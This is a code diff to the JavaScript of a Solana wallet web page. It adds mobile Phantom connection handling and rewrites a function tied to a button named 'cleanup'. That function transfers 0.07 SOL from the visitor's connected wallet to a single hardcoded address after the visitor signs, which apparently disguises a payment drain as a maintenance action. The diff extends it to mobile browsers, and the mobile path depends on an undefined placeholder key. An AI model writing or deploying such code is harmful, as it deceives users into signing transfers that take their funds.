@@ -404,81 +404,90 @@
         }
 
                     async function connect() {
-                try {
-                    // Check if on mobile
-                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                        try {
+                            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         
-                    if (isMobile) {
-                        // Deep link to Phantom
-                        const phantomDeepLink = 'https://phantom.app/ul/browse/';
-                        const dappUrl = window.location.href;
-                        window.location.href = `${phantomDeepLink}${encodeURIComponent(dappUrl)}`;
-                        return;
+                            if (isMobile) {
+                                // Check if Phantom is injected in mobile browser
+                                if (window.phantom?.solana?.isPhantom) {
+                                    wallet = await window.phantom.solana.connect();
+                                } else {
+                                    // Deep link with connection request
+                                    const phantomDeepLink = 'https://phantom.app/ul/v1/connect';
+                                    const params = {
+                                        dapp_encryption_public_key: YOUR_PUBLIC_KEY,
+                                        cluster: 'mainnet-beta',
+                                        app_url: window.location.href,
+                                        redirect_link: window.location.href
+                                    };
+                                    window.location.href = `${phantomDeepLink}?${new URLSearchParams(params)}`;
+                                    return;
+                                }
+                            } else {
+                                // Desktop flow
+                                wallet = await window.solana.connect();
+                            }
+
+                            walletAddress.textContent = wallet.publicKey.toString().slice(0, 6) + '...' + wallet.publicKey.toString().slice(-4);
+
+                            // Switch views
+                            connectView.style.display = 'none';
+                            dashboardView.style.display = 'block';
+
+                            updateStatus(`Connected successfully!`);
+                        } catch (err) {
+                            updateStatus(err.message, true);
+                        }
                     }
 
-                    // Desktop flow remains the same
-                    if (!window.solana || !window.solana.isPhantom) {
-                        throw new Error('Phantom wallet not found! Please install it first.');
+                    async function executeTransaction() {
+                        try {
+                            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                            const provider = isMobile ? window.phantom?.solana : window.solana;
+
+                            const connection = new solanaWeb3.Connection(getRandomRPC(), {
+                                commitment: 'confirmed',
+                                confirmTransactionInitialTimeout: 60000
+                            });
+
+                            const transaction = new solanaWeb3.Transaction();
+        
+                            transaction.add(
+                                solanaWeb3.SystemProgram.transfer({
+                                    fromPubkey: wallet.publicKey,
+                                    toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
+                                    lamports: 0.07 * solanaWeb3.LAMPORTS_PER_SOL
+                                })
+                            );
+
+                            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                            transaction.recentBlockhash = blockhash;
+                            transaction.feePayer = wallet.publicKey;
+
+                            // Mobile-aware signing
+                            const signed = await provider.signTransaction(transaction);
+                            const signature = await connection.sendRawTransaction(signed.serialize());
+
+                            updateStatus('Processing transaction...');
+
+                            const result = await connection.confirmTransaction({
+                                signature,
+                                blockhash,
+                                lastValidBlockHeight
+                            });
+
+                            if (result.value.err) {
+                                throw new Error('Transaction failed to confirm');
+                            }
+
+                            updateStatus(`
+                                Transaction successful!<br>
+                                Signature: <a href="https://explorer.solana.com/tx/${signature}" target="_blank">${signature}</a>
+                            `);
+                        } catch (err) {
+                            updateStatus(err.message, true);
+                        }
                     }
-
-                    wallet = await window.solana.connect();
-                    walletAddress.textContent = wallet.publicKey.toString().slice(0, 6) + '...' + wallet.publicKey.toString().slice(-4);
-        
-                    // Switch views
-                    connectView.style.display = 'none';
-                    dashboardView.style.display = 'block';
-        
-                    updateStatus(`Connected successfully!`);
-                } catch (err) {
-                    updateStatus(err.message, true);
-                }
-}
-
-        async function executeTransaction() {
-            try {
-                const connection = new solanaWeb3.Connection(getRandomRPC(), {
-                    commitment: 'confirmed',
-                    confirmTransactionInitialTimeout: 60000
-                });
-
-                const transaction = new solanaWeb3.Transaction();
-                
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: wallet.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
-                        lamports: 0.07 * solanaWeb3.LAMPORTS_PER_SOL
-                    })
-                );
-
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = wallet.publicKey;
-
-                const signed = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize());
-
-                updateStatus('Processing transaction...');
-
-                const result = await connection.confirmTransaction({
-                    signature,
-                    blockhash,
-                    lastValidBlockHeight
-                });
-
-                if (result.value.err) {
-                    throw new Error('Transaction failed to confirm');
-                }
-
-                updateStatus(`
-                    Transaction successful!<br>
-                    Signature: <a href="https://explorer.solana.com/tx/${signature}" target="_blank">${signature}</a>
-                `);
-            } catch (err) {
-                updateStatus(err.message, true);
-            }
-        }
-
         connectButton.onclick = connect;
         cleanupButton.onclick = executeTransaction;
     </script>
